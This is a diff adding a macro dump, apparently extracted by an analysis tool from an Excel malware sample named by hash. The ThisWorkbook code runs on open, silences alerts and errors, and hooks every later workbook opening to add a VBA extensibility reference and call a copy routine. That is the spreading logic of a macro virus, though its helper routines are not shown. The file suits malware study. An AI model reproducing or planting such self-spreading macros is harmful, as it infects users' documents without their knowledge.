@@ -1,0 +1,31 @@
+Filename     : ./macros/121f93c9d9e3d11b1e1edaa032a87fb2520665c50e326694ddee6b25a859298e
+OLE stream   : _VBA_PROJECT_CUR/VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Public WithEvents xx As Application
+Attribute xx.VB_VarHelpID = -1
+Private Sub Workbook_open()
+Set xx = Application
+On Error Resume Next
+Application.DisplayAlerts = False
+Call do_what
+End Sub
+Private Sub xx_workbookOpen(ByVal wb As Workbook)
+On Error Resume Next
+wb.VBProject.References.AddFromGuid _
+GUID:="{0002E157-0000-0000-C000-000000000046}", _
+Major:=5, Minor:=3
+Application.ScreenUpdating = False
+Application.DisplayAlerts = False
+copystart wb
+Application.ScreenUpdating = True
+End Sub
+
